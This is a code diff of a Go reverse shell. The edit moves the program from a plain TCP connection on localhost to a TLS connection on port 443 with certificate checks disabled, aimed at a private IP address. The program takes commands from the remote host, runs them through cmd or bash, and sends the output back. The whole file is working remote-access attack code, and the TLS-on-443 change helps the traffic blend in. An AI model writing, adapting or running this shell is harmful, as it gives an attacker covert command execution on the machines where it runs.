@@ -1,32 +1,33 @@
-//this is my first reverse shell written in go lang
 package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"fmt"
 	"log"
-	"net"
+	"os"
 	"os/exec"
 )
 
-// to run, use go run
-// if compiling to a windows binary, the window will need to stay open and be hidden <---- TODO?
 func main() {
-	shell("127.0.0.1:4444")
+	shell("10.0.0.32:443")
 }
 
 func shell(host string) {
-	conn, err := net.Dial("tcp", host)
-	if err != nil {
-		log.Fatal(err)
-	}
 
+	conf := &tls.Config{InsecureSkipVerify: true} //comment out 'InsecureSkipVerify: true' to use a legitiment  cert from an authorized CA
+	conn, err := tls.Dial("tcp", host, conf)
+	if err != nil {
+		log.Println(err)
+	}
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
 		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
 		if err != nil {
 			fmt.Println(err)
+			os.Exit(1)
 		}
 		conn.Write(out)
 	}
+
 }
